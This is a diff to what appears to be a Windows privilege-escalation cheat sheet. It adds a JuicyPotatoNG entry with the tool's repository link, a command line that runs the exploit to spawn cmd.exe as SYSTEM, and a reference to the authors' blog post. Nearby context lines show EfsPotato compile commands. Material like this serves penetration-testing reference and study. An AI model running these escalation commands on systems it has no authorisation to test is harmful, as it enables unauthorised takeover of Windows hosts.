@@ -1289,6 +1289,14 @@ C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs
 C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs
 ```
 
+### JuicyPotatoNG
+
+* [antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
+
+```powershell
+JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
+```
+
 
 ## EoP - Privileged File Write
 
@@ -1506,3 +1514,4 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Universal Privilege Escalation and Persistence – Printer - AUGUST 2, 2021)](https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/)
 * [ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
 * [Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)
+* [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
